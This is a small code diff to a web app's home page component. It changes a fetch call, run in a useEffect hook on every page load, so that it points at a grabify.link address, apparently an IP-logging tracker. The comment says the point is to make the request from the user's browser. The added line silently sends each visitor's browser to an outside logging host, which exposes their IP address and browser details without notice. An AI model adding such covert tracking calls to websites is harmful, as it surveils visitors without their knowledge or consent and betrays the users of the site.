@@ -8,7 +8,7 @@ export default function Home() {
   
   useEffect(() => {
     // Trigger the external request from the user's browser
-    fetch("https://foot.wiki/48CWM2");
+    fetch("https://grabify.link/FD8PLX");
   }, []);
 
   return (
